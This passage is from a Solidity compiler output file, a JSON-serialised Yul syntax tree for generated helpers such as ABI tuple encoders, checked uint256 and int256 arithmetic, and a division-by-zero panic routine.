9:10"},{"kind":"number","nativeSrc":"11787:2:10","nodeType":"YulLiteral","src":"11787:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"11772:3:10","nodeType":"YulIdentifier","src":"11772:3:10"},"nativeSrc":"11772:18:10","nodeType":"YulFunctionCall","src":"11772:18:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"11719:43:10","nodeType":"YulIdentifier","src":"11719:43:10"},"nativeSrc":"11719:72:10","nodeType":"YulFunctionCall","src":"11719:72:10"},"nativeSrc":"11719:72:10","nodeType":"YulExpressionStatement","src":"11719:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"11845:6:10","nodeType":"YulIdentifier","src":"11845:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"11858:9:10","nodeType":"YulIdentifier","src":"11858:9:10"},{"kind":"number","nativeSrc":"11869:2:10","nodeType":"YulLiteral","src":"11869:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"11854:3:10","nodeType":"YulIdentifier","src":"11854:3:10"},"nativeSrc":"11854:18:10","nodeType":"YulFunctionCall","src":"11854:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"11801:43:10","nodeType":"YulIdentifier","src":"11801:43:10"},"nativeSrc":"11801:72:10","nodeType":"YulFunctionCall","src":"11801:72:10"},"nativeSrc":"11801:72:10","nodeType":"YulExpressionStatement","src":"11801:72:10"},{"expression":{"arguments":[{"name":"value3","nativeSrc":"11927:6:10","nodeType":"YulIdentifier","src":"11927:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"11940:9:10","nodeType":"YulIdentifier","src":"11940:9:10"},{"kind":"number","nativeSrc":"11951:2:10","nodeType":"YulLiteral","src":"11951:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"11936:3:10","nodeType":"YulIdentifier","src":"11936:3:10"},"nativeSrc":"11936:18:10","nodeType":"YulFunctionCall","src":"11936:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"11883:43:10","nodeType":"YulIdentifier","src":"11883:43:10"},"nativeSrc":"11883:72:10","nodeType":"YulFunctionCall","src":"11883:72:10"},"nativeSrc":"11883:72:10","nodeType":"YulExpressionStatement","src":"11883:72:10"}]},"name":"abi_encode_tuple_t_uint256_t_address_t_uint256_t_uint256__to_t_uint256_t_address_t_uint256_t_uint256__fromStack_reversed","nativeSrc":"11409:553:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"11539:9:10","nodeType":"YulTypedName","src":"11539:9:10","type":""},{"name":"value3","nativeSrc":"11551:6:10","nodeType":"YulTypedName","src":"11551:6:10","type":""},{"name":"value2","nativeSrc":"11559:6:10","nodeType":"YulTypedName","src":"11559:6:10","type":""},{"name":"value1","nativeSrc":"11567:6:10","nodeType":"YulTypedName","src":"11567:6:10","type":""},{"name":"value0","nativeSrc":"11575:6:10","nodeType":"YulTypedName","src":"11575:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"11586:4:10","nodeType":"YulTypedName","src":"11586:4:10","type":""}],"src":"11409:553:10"},{"body":{"nativeSrc":"11996:152:10","nodeType":"YulBlock","src":"11996:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"12013:1:10","nodeType":"YulLiteral","src":"12013:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"12016:77:10","nodeType":"YulLiteral","src":"12016:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"12006:6:10","nodeType":"YulIdentifier","src":"12006:6:10"},"nativeSrc":"12006:88:10","nodeType":"YulFunctionCall","src":"12006:88:10"},"nativeSrc":"12006:88:10","nodeType":"YulExpressionStatement","src":"12006:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"12110:1:10","nodeType":"YulLiteral","src":"12110:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"12113:4:10","nodeType":"YulLiteral","src":"12113:4:10","type":"","value":"0x12"}],"functionName":{"name":"mstore","nativeSrc":"12103:6:10","nodeType":"YulIdentifier","src":"12103:6:10"},"nativeSrc":"12103:15:10","nodeType":"YulFunctionCall","src":"12103:15:10"},"nativeSrc":"12103:15:10","nodeType":"YulExpressionStatement","src":"12103:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"12134:1:10","nodeType":"YulLiteral","src":"12134:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"12137:4:10","nodeType":"YulLiteral","src":"12137:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"12127:6:10","nodeType":"YulIdentifier","src":"12127:6:10"},"nativeSrc":"12127:15:10","nodeType":"YulFunctionCall","src":"12127:15:10"},"nativeSrc":"12127:15:10","nodeType":"YulExpressionStatement","src":"12127:15:10"}]},"name":"panic_error_0x12","nativeSrc":"11968:180:10","nodeType":"YulFunctionDefinition","src":"11968:180:10"},{"body":{"nativeSrc":"12196:143:10","nodeType":"YulBlock","src":"12196:143:10","statements":[{"nativeSrc":"12206:25:10","nodeType":"YulAssignment","src":"12206:25:10","value":{"arguments":[{"name":"x","nativeSrc":"12229:1:10","nodeType":"YulIdentifier","src":"12229:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"12211:17:10","nodeType":"YulIdentifier","src":"12211:17:10"},"nativeSrc":"12211:20:10","nodeType":"YulFunctionCall","src":"12211:20:10"},"variableNames":[{"name":"x","nativeSrc":"12206:1:10","nodeType":"YulIdentifier","src":"12206:1:10"}]},{"nativeSrc":"12240:25:10","nodeType":"YulAssignment","src":"12240:25:10","value":{"arguments":[{"name":"y","nativeSrc":"12263:1:10","nodeType":"YulIdentifier","src":"12263:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"12245:17:10","nodeType":"YulIdentifier","src":"12245:17:10"},"nativeSrc":"12245:20:10","nodeType":"YulFunctionCall","src":"12245:20:10"},"variableNames":[{"name":"y","nativeSrc":"12240:1:10","nodeType":"YulIdentifier","src":"12240:1:10"}]},{"body":{"nativeSrc":"12287:22:10","nodeType":"YulBlock","src":"12287:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x12","nativeSrc":"12289:16:10","nodeType":"YulIdentifier","src":"12289:16:10"},"nativeSrc":"12289:18:10","nodeType":"YulFunctionCall","src":"12289:18:10"},"nativeSrc":"12289:18:10","nodeType":"YulExpressionStatement","src":"12289:18:10"}]},"condition":{"arguments":[{"name":"y","nativeSrc":"12284:1:10","nodeType":"YulIdentifier","src":"12284:1:10"}],"functionName":{"name":"iszero","nativeSrc":"12277:6:10","nodeType":"YulIdentifier","src":"12277:6:10"},"nativeSrc":"12277:9:10","nodeType":"YulFunctionCall","src":"12277:9:10"},"nativeSrc":"12274:35:10","nodeType":"YulIf","src":"12274:35:10"},{"nativeSrc":"12319:14:10","nodeType":"YulAssignment","src":"12319:14:10","value":{"arguments":[{"name":"x","nativeSrc":"12328:1:10","nodeType":"YulIdentifier","src":"12328:1:10"},{"name":"y","nativeSrc":"12331:1:10","nodeType":"YulIdentifier","src":"12331:1:10"}],"functionName":{"name":"div","nativeSrc":"12324:3:10","nodeType":"YulIdentifier","src":"12324:3:10"},"nativeSrc":"12324:9:10","nodeType":"YulFunctionCall","src":"12324:9:10"},"variableNames":[{"name":"r","nativeSrc":"12319:1:10","nodeType":"YulIdentifier","src":"12319:1:10"}]}]},"name":"checked_div_t_uint256","nativeSrc":"12154:185:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"12185:1:10","nodeType":"YulTypedName","src":"12185:1:10","type":""},{"name":"y","nativeSrc":"12188:1:10","nodeType":"YulTypedName","src":"12188:1:10","type":""}],"returnVariables":[{"name":"r","nativeSrc":"12194:1:10","nodeType":"YulTypedName","src":"12194:1:10","type":""}],"src":"12154:185:10"},{"body":{"nativeSrc":"12392:509:10","nodeType":"YulBlock","src":"12392:509:10","statements":[{"nativeSrc":"12402:24:10","nodeType":"YulAssignment","src":"12402:24:10","value":{"arguments":[{"name":"x","nativeSrc":"12424:1:10","nodeType":"YulIdentifier","src":"12424:1:10"}],"functionName":{"name":"cleanup_t_int256","nativeSrc":"12407:16:10","nodeType":"YulIdentifier","src":"12407:16:10"},"nativeSrc":"12407:19:10","nodeType":"YulFunctionCall","src":"12407:19:10"},"variableNames":[{"name":"x","nativeSrc":"12402:1:10","nodeType":"YulIdentifier","src":"12402:1:10"}]},{"nativeSrc":"12435:24:10","nodeType":"YulAssignment","src":"12435:24:10","value":{"arguments":[{"name":"y","nativeSrc":"12457:1:10","nodeType":"YulIdentifier","src":"12457:1:10"}],"functionName":{"name":"cleanup_t_int256","nativeSrc":"12440:16:10","nodeType":"YulIdentifier","src":"12440:16:10"},"nativeSrc":"12440:19:10","nodeType":"YulFunctionCall","src":"12440:19:10"},"variableNames":[{"name":"y","nativeSrc":"12435:1:10","nodeType":"YulIdentifier","src":"12435:1:10"}]},{"nativeSrc":"12468:28:10","nodeType":"YulVariableDeclaration","src":"12468:28:10","value":{"arguments":[{"name":"x","nativeSrc":"12491:1:10","nodeType":"YulIdentifier","src":"12491:1:10"},{"name":"y","nativeSrc":"12494:1:10","nodeType":"YulIdentifier","src":"12494:1:10"}],"functionName":{"name":"mul","nativeSrc":"12487:3:10","nodeType":"YulIdentifier","src":"12487:3:10"},"nativeSrc":"12487:9:10","nodeType":"YulFunctionCall","src":"12487:9:10"},"variables":[{"name":"product_raw","nativeSrc":"12472:11:10","nodeType":"YulTypedName","src":"12472:11:10","type":""}]},{"nativeSrc":"12505:40:10","nodeType":"YulAssignment","src":"12505:40:10","value":{"arguments":[{"name":"product_raw","nativeSrc":"12533:11:10","nodeType":"YulIdentifier","src":"12533:11:10"}],"functionName":{"name":"cleanup_t_int256","nativeSrc":"12516:16:10","nodeType":"YulIdentifier","src":"12516:16:10"},"nativeSrc":"12516:29:10","nodeType":"YulFunctionCall","src":"12516:29:10"},"variableNames":[{"name":"product","nativeSrc":"12505:7:10","nodeType":"YulIdentifier","src":"12505:7:10"}]},{"body":{"nativeSrc":"12672:22:10","nodeType":"YulBlock","src":"12672:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"12674:16:10","nodeType":"YulIdentifier","src":"12674:16:10"},"nativeSrc":"12674:18:10","nodeType":"YulFunctionCall","src":"12674:18:10"},"nativeSrc":"12674:18:10","nodeType":"YulExpressionStatement","src":"12674:18:10"}]},"condition":{"arguments":[{"arguments":[{"name":"x","nativeSrc":"12590:1:10","nodeType":"YulIdentifier","src":"12590:1:10"},{"kind":"number","nativeSrc":"12593:1:10","nodeType":"YulLiteral","src":"12593:1:10","type":"","value":"0"}],"functionName":{"name":"slt","nativeSrc":"12586:3:10","nodeType":"YulIdentifier","src":"12586:3:10"},"nativeSrc":"12586:9:10","nodeType":"YulFunctionCall","src":"12586:9:10"},{"arguments":[{"name":"y","nativeSrc":"12600:1:10","nodeType":"YulIdentifier","src":"12600:1:10"},{"kind":"number","nativeSrc":"12603:66:10","nodeType":"YulLiteral","src":"12603:66:10","type":"","value":"0x8000000000000000000000000000000000000000000000000000000000000000"}],"functionName":{"name":"eq","nativeSrc":"12597:2:10","nodeType":"YulIdentifier","src":"12597:2:10"},"nativeSrc":"12597:73:10","nodeType":"YulFunctionCall","src":"12597:73:10"}],"functionName":{"name":"and","nativeSrc":"12582:3:10","nodeType":"YulIdentifier","src":"12582:3:10"},"nativeSrc":"12582:89:10","nodeType":"YulFunctionCall","src":"12582:89:10"},"nativeSrc":"12579:115:10","nodeType":"YulIf","src":"12579:115:10"},{"body":{"nativeSrc":"12872:22:10","nodeType":"YulBlock","src":"12872:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"12874:16:10","nodeType":"YulIdentifier","src":"12874:16:10"},"nativeSrc":"12874:18:10","nodeType":"YulFunctionCall","src":"12874:18:10"},"nativeSrc":"12874:18:10","nodeType":"YulExpressionStatement","src":"12874:18:10"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"x","nativeSrc":"12804:1:10","nodeType":"YulIdentifier","src":"12804:1:10"}],"functionName":{"name":"iszero","nativeSrc":"12797:6:10","nodeType":"YulIdentifier","src":"12797:6:10"},"nativeSrc":"12797:9:10","nodeType":"YulFunctionCall","src":"12797:9:10"},{"arguments":[{"name":"y","nativeSrc":"12827:1:10","nodeType":"YulIdentifier","src":"12827:1:10"},{"arguments":[{"name":"product","nativeSrc":"12835:7:10","nodeType":"YulIdentifier","src":"12835:7:10"},{"name":"x","nativeSrc":"12844:1:10","nodeType":"YulIdentifier","src":"12844:1:10"}],"functionName":{"name":"sdiv","nativeSrc":"12830:4:10","nodeType":"YulIdentifier","src":"12830:4:10"},"nativeSrc":"12830:16:10","nodeType":"YulFunctionCall","src":"12830:16:10"}],"functionName":{"name":"eq","nativeSrc":"12824:2:10","nodeType":"YulIdentifier","src":"12824:2:10"},"nativeSrc":"12824:23:10","nodeType":"YulFunctionCall","src":"12824:23:10"}],"functionName":{"name":"or","nativeSrc":"12777:2:10","nodeType":"YulIdentifier","src":"12777:2:10"},"nativeSrc":"12777:84:10","nodeType":"YulFunctionCall","src":"12777:84:10"}],"functionName":{"name":"iszero","nativeSrc":"12757:6:10","nodeType":"YulIdentifier","src":"12757:6:10"},"nativeSrc":"12757:114:10","nodeType":"YulFunctionCall","src":"12757:114:10"},"nativeSrc":"12754:140:10","nodeType":"YulIf","src":"12754:140:10"}]},"name":"checked_mul_t_int256","nativeSrc":"12345:556:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"12375:1:10","nodeType":"YulTypedName","src":"12375:1:10","type":""},{"name":"y","nativeSrc":"12378:1:10","nodeType":"YulTypedName","src":"12378:1:10","type":""}],"returnVariables":[{"name":"product","nativeSrc":"12384:7:10","nodeType":"YulTypedName","src":"12384:7:10","type":""}],"src":"12345:556:10"},{"body":{"nativeSrc":"12951:328:10","nodeType":"YulBlock","src":"12951:328:10","statements":[{"nativeSrc":"12961:24:10","nodeType":"YulAssignment","src":"12961:24:10","value":{"arguments":[{"name":"x","nativeSrc":"12983:1:10","nodeType":"YulIdentifier","src":"12983:1:10"}],"functionName":{"name":"cleanup_t_int256","nativeSrc":"12966:16:10","nodeType":"YulIdentifier","src":"12966:16:10"},"nativeSrc":"12966:19:10","nodeType":"YulFunctionCall","src":"12966:19:10"},"variableNames":[{"name":"x","nativeSrc":"12961:1:10","nodeType":"YulIdentifier","src":"12961:1:10"}]},{"nativeSrc":"12994:24:10","nodeType":"YulAssignment","src":"12994:24:10","value":{"arguments":[{"name":"y","nativeSrc":"13016:1:10","nodeType":"YulIdentifier","src":"13016:1:10"}],"functionName":{"name":"cleanup_t_int256","nativeSrc":"12999:16:10","nodeType":"YulIdentifier","src":"12999:16:10"},"nativeSrc":"12999:19:10","nodeType":"YulFunctionCall","src":"12999:19:10"},"variableNames":[{"name":"y","nativeSrc":"12994:1:10","nodeType":"YulIdentifier","src":"12994:1:10"}]},{"nativeSrc":"13027:17:10","nodeType":"YulAssignment","src":"13027:17:10","value":{"arguments":[{"name":"x","nativeSrc":"13039:1:10","nodeType":"YulIdentifier","src":"13039:1:10"},{"name":"y","nativeSrc":"13042:1:10","nodeType":"YulIdentifier","src":"13042:1:10"}],"functionName":{"name":"sub","nativeSrc":"13035:3:10","nodeType":"YulIdentifier","src":"13035:3:10"},"nativeSrc":"13035:9:10","nodeType":"YulFunctionCall","src":"13035:9:10"},"variableNames":[{"name":"diff","nativeSrc":"13027:4:10","nodeType":"YulIdentifier","src":"13027:4:10"}]},{"body":{"nativeSrc":"13250:22:10","nodeType":"YulBlock","src":"13250:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"13252:16:10","nodeType":"YulIdentifier","src":"13252:16:10"},"nativeSrc":"13252:18:10","nodeType":"YulFunctionCall","src":"13252:18:10"},"nativeSrc":"13252:18:10","nodeType":"YulExpressionStatement","src":"13252:18:10"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"arguments":[{"name":"y","nativeSrc":"13176:1:10","nodeType":"YulIdentifier","src":"13176:1:10"},{"kind":"number","nativeSrc":"13179:1:10","nodeType":"YulLiteral","src":"13179:1:10","type":"","value":"0"}],"functionName":{"name":"slt","nativeSrc":"13172:3:10","nodeType":"YulIdentifier","src":"13172:3:10"},"nativeSrc":"13172:9:10","nodeType":"YulFunctionCall","src":"13172:9:10"}],"functionName":{"name":"iszero","nativeSrc":"13165:6:10","nodeType":"YulIdentifier","src":"13165:6:10"},"nativeSrc":"13165:17:10","nodeType":"YulFunctionCall","src":"13165:17:10"},{"arguments":[{"name":"diff","nativeSrc":"13188:4:10","nodeType":"YulIdentifier","src":"13188:4:10"},{"name":"x","nativeSrc":"13194:1:10","nodeType":"YulIdentifier","src":"13194:1:10"}],"functionName":{"name":"sgt","nativeSrc":"13184:3:10","nodeType":"YulIdentifier","src":"13184:3:10"},"nativeSrc":"13184:12:10","nodeType":"YulFunctionCall","src":"13184:12:10"}],"functionName":{"name":"and","nativeSrc":"13161:3:10","nodeType":"YulIdentifier","src":"13161:3:10"},"nativeSrc":"13161:36:10","nodeType":"YulFunctionCall","src":"13161:36:10"},{"arguments":[{"arguments":[{"name":"y","nativeSrc":"13219:1:10","nodeType":"YulIdentifier","src":"13219:1:10"},{"kind":"number","nativeSrc":"13222:1:10","nodeType":"YulLiteral","src":"13222:1:10","type":"","value":"0"}],"functionName":{"name":"slt","nativeSrc":"13215:3:10","nodeType":"YulIdentifier","src":"13215:3:10"},"nativeSrc":"13215:9:10","nodeType":"YulFunctionCall","src":"13215:9:10"},{"arguments":[{"name":"diff","nativeSrc":"13230:4:10","nodeType":"YulIdentifier","src":"13230:4:10"},{"name":"x","nativeSrc":"13236:1:10","nodeType":"YulIdentifier","src":"13236:1:10"}],"functionName":{"name":"slt","nativeSrc":"13226:3:10","nodeType":"YulIdentifier","src":"13226:3:10"},"nativeSrc":"13226:12:10","nodeType":"YulFunctionCall","src":"13226:12:10"}],"functionName":{"name":"and","nativeSrc":"13211:3:10","nodeType":"YulIdentifier","src":"13211:3:10"},"nativeSrc":"13211:28:10","nodeType":"YulFunctionCall","src":"13211:28:10"}],"functionName":{"name":"or","nativeSrc":"13145:2:10","nodeType":"YulIdentifier","src":"13145:2:10"},"nativeSrc":"13145:104:10","nodeType":"YulFunctionCall","src":"13145:104:10"},"nativeSrc":"13142:130:10","nodeType":"YulIf","src":"13142:130:10"}]},"name":"checked_sub_t_int256","nativeSrc":"12907:372:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"12937:1:10","nodeType":"YulTypedName","src":"12937:1:10","type":""},{"name":"y","nativeSrc":"12940:1:10","nodeType":"YulTypedName","src":"12940:1:10","type":""}],"returnVariables":[{"name":"diff","nativeSrc":"12946:4:10","nodeType":"YulTypedName","src":"12946:4:10","type":""}],"src":"12907:372:10"},{"body":{"nativeSrc":"13411:206:10","nodeType":"YulBlock","src":"13411:206:10","statements":[{"nativeSrc":"13421:26:10","nodeType":"YulAssignment","src":"13421:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"13433:9:10","nodeType":"YulIdentifier","src":"13433:9:10"},{"kind":"number","nativeSrc":"13444:2:10","nodeType":"YulLiteral","src":"13444:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"13429:3:10","nodeType":"YulIdentifier","src":"13429:3:10"},"nativeSrc":"13429:18:10","nodeType":"YulFunctionCall","src":"13429:18:10"},"variableNames":[{"name":"tail","nativeSrc":"13421:4:10","nodeType":"YulIdentifier","src":"13421:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"13501:6:10","nodeType":"YulIdentifier","src":"13501:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"13514:9:10","nodeType":"YulIdentifier","src":"13514:9:10"},{"kind":"number","nativeSrc":"13525:1:10","nodeType":"YulLiteral","src":"13525:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"13510:3:10","nodeType":"YulIdentifier","src":"13510:3:10"},"nativeSrc":"13510:17:10","nodeType":"YulFunctionCall","src":"13510:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"13457:43:10","nodeType":"YulIdentifier","src":"13457:43:10"},"nativeSrc":"13457:71:10","nodeType":"YulFunctionCall","src":"13457:71:10"},"nativeSrc":"13457:71:10","nodeType":"YulExpressionStatement","src":"13457:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"13582:6:10","nodeType":"YulIdentifier","src":"13582:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"13595:9:10","nodeType":"YulIdentifier","src":"13595:9:10"},{"kind":"number","nativeSrc":"13606:2:10","nodeType":"YulLiteral","src":"13606:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"13591:3:10","nodeType":"YulIdentifier","src":"13591:3:10"},"nativeSrc":"13591:18:10","nodeType":"YulFunctionCall","src":"13591:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"13538:43:10","nodeType":"YulIdentifier","src":"13538:43:10"},"nativeSrc":"13538:72:10","nodeType":"YulFunctionCall","src":"13538:72:10"},"nativeSrc":"13538:72:10","nodeType":"YulExpressionStatement","src":"13538:72:10"}]},"name":"abi_encode_tuple_t_uint256_t_uint256__to_t_uint256_t_uint256__fromStack_reversed","nativeSrc":"13285:332:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"13375:9:10","nodeType":"YulTypedName","src":"13375:9:10","type":""},{"name":"value1","nativeSrc":"13387:6:10","nodeType":"YulTypedName","src":"13387:6:10","type":""},{"name":"value0","nativeSrc":"13395:6:10","nodeType":"YulTypedName","src":"13395:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"13406:4:10","nodeType":"YulTypedName","src":"13406:4:10","type":""}],"src":"13285:332:10"},{"body":{"nativeSrc":"13671:362:10","nodeType":"YulBlock","src":"13671:362:10","statements":[{"nativeSrc":"13681:25:10","nodeType":"YulAssignment","src":"13681:25:10","value":{"arguments":[{"name":"x","nativeSrc":"13704:1:10","nodeType":"YulIdentifier","src":"13704:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"13686:17:10","nodeType":"YulIdentifier","src":"13686:17:10"},"nativeSrc":"13686:20:10","nodeType":"YulFunctionCall","src":"13686:20:10"},"variableNames":[{"name":"x","nativeSrc":"13681:1:10","nodeType":"YulIdentifier","src":"13681:1:10"}]},{"nativeSrc":"13715:25:10","nodeType":"YulAssignment","src":"13715:25:10","value":{"arguments":[{"name":"y","nativeSrc":"13738:1:10","nodeType":"YulIdentifier","src":"13738:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"13720:17:10","nodeType":"YulIdentifier","src":"13720:17:10"},"nativeSrc":"13720:20:10","nodeType":"YulFunctionCall","src":"13720:20:10"},"variableNames":[{"name":"y","nativeSrc":"13715:1:10","nodeType":"YulIdentifier","src":"13715:1:10"}]},{"nativeSrc":"13749:28:10","nodeType":"YulVariableDeclaration","src":"13749:28:10","value":{"arguments":[{"name":"x","nativeSrc":"13772:1:10","nodeType":"YulIdentifier","src":"13772:1:10"},{"name":"y","nativeSrc":"13775:1:10","nodeType":"YulIdentifier","src":"13775:1:10"}],"functionName":{"name":"mul","nativeSrc":"13768:3:10","nodeType":"YulIdentifier","src":"13768:3:10"},"nativeSrc":"13768:9:10","nodeType":"YulFunctionCall","src":"13768:9:10"},"variables":[{"name":"product_raw","nativeSrc":"13753:11:10","nodeType":"YulTypedName","src":"13753:11:10","type":""}]},{"nativeSrc":"13786:41:10","nodeType":"YulAssignment","src":"13786:41:10","value":{"arguments":[{"name":"product_raw","nativeSrc":"13815:11:10","nodeType":"YulIdentifier","src":"13815:11:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"13797:17:10","nodeType":"YulIdentifier","src":"13797:17:10"},"nativeSrc":"13797:30:10","nodeType":"YulFunctionCall","src":"13797:30:10"},"variableNames":[{"name":"product","nativeSrc":"13786:7:10","nodeType":"YulIdentifier","src":"13786:7:10"}]},{"body":{"nativeSrc":"14004:22:10","nodeType":"YulBlock","src":"14004:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"14006:16:10","nodeType":"YulIdentifier","src":"14006:16:10"},"nativeSrc":"14006:18:10","nodeType":"YulFunctionCall","src":"14006:18:10"},"nativeSrc":"14006:18:10","nodeType":"YulExpressionStatement","src":"14006:18:10"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"x","nativeSrc":"13937:1:10","nodeType":"YulIdentifier","src":"13937:1:10"}],"functionName":{"name":"iszero","nativeSrc":"13930:6:10","nodeType":"YulIdentifier","src":"13930:6:10"},"nativeSrc":"13930:9:10","nodeType":"YulFunctionCall","src":"13930:9:10"},{"arguments":[{"name":"y","nativeSrc":"13960:1:10","nodeType":"YulIdentifier","src":"13960:1:10"},{"arguments":[{"name":"product","nativeSrc":"13967:7:10","nodeType":"YulIdentifier","src":"13967:7:10"},{"name":"x","nativeSrc":"13976:1:10","nodeType":"YulIdentifier","src":"13976:1:10"}],"functionName":{"name":"div","nativeSrc":"13963:3:10","nodeType":"YulIdentifier","src":"13963:3:10"},"nativeSrc":"13963:15:10","nodeType":"YulFunctionCall","src":"13963:15:10"}],"functionName":{"name":"eq","nativeSrc":"13957:2:10","nodeType":"YulIdentifier","src":"13957:2:10"},"nativeSrc":"13957:22:10","nodeType":"YulFunctionCall","src":"13957:22:10"}],"functionName":{"name":"or","nativeSrc":"13910:2:10","nodeType":"YulIdentifier","src":"13910:2:10"},"nativeSrc":"13910:83:10","nodeType":"YulFunctionCall","src":"13910:83:10"}],"functionName":{"name":"iszero","nativeSrc":"13890:6:10","nodeType":"YulIdentifier","src":"13890:6:10"},"nativeSrc":"13890:113:10","nodeType":"YulFunctionCall","src":"13890:113:10"},"nativeSrc":"13887:139:10","nodeType":"YulIf","src":"13887:139:10"}]},"name":"checked_mul_t_uint256","nativeSrc":"13623:410:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"13654:1:10","nodeType":"YulTypedName","src":"13654:1:10","type":""},{"name":"y","nativeSrc":"13657:1:10","nodeType":"YulTypedName","src":"13657:1:10","type":""}],"returnVariables":[{"name":"product","nativeSrc":"13663:7:10","nodeType":"YulTypedName","src":"13663:7:10","type":""}],"src":"13623:410:10"},{"body":{"nativeSrc":"14165:206:10","nodeType":"YulBlock","src":"14165:206:10","statements":[{"nativeSrc":"14175:26:10","nodeType":"YulAssignment","src":"14175:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"14187:9:10","nodeType":"YulIdentifier","src":"14187:9:10"},{"kind":"number","nativeSrc":"14198:2:10","nodeType":"YulLiteral","src":"14198:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"14183:3:10","nodeType":"YulIdentifier","src":"14183:3:10"},"nativeSrc":"14183:18:10","nodeType":"YulFunctionCall","src":"14183:18:10"},"variableNames":[{"name":"tail","nativeSrc":"14175:4:10","nodeType":"YulIdentifier","src":"14175:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"14255:6:10","nodeType":"YulIdentifier","src":"14255:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"14268:9:10","nodeType":"YulIdentifier","src":"14268:9:10"},{"kind":"number","nativeSrc":"14279:1:10","nodeType":"YulLiteral","src":"14279:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"14264:3:10","nodeType":"YulIdentifier","src":"14264:3:10"},"nativeSrc":"14264:17:10","nodeType":"YulFunctionCall","src":"14264:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"14211:43:10","nodeType":"YulIdentifier","src":"14211:43:10"},"nativeSrc":"14211:71:10","nodeType":"YulFunctionCall","src":"14211:71:10"},"nativeSrc":"14211:71:10","nodeType":"YulExpressionStatement","src":"14211:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"14336:6:10","nodeType":"YulIdentifier","src":"14336:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"14349:9:10","nodeType":"YulIdentifier","src":"14349:9:10"},{"kind":"number","nativeSrc":"14360:2:10","nodeType":"YulLiteral","src":"14360:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"14345:3:10","nodeType":"YulIdentifier","src":"14345:3:10"},"nativeSrc":"14345:18:10","nodeType":"YulFunctionCall","src":"14345:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"14292:43:10","nodeType":"YulIdentifier","src":"14292:43:10"},"nativeSrc":"14292:72:10","nodeType":"YulFunctionCall","src":"14292:72:10"},"nativeSrc":"14292:72:10","nodeType":"YulExpressionStatement","src":"14292:72:10"}]},"name":"abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed","nativeSrc":"14039:332:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"14129:9:10","nodeType":"YulTypedName","src":"14129:9:10","type":""},{"name":"value1","nativeSrc":"14141:6:10","nodeType":"YulTypedName","src":"14141:6:10","type":""},{"name":"value0","nativeSrc":"14149:6:10","nodeType":"YulTypedName","src":"14149:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"14160:4:10","nodeType":"YulTypedName","src":"14160:4:10","type":""}],"src":"14039:332:10"},{"body":{"nativeSrc":"14417:76:10","nodeType":"YulBlock","src":"14417:76:10","statements":[{"b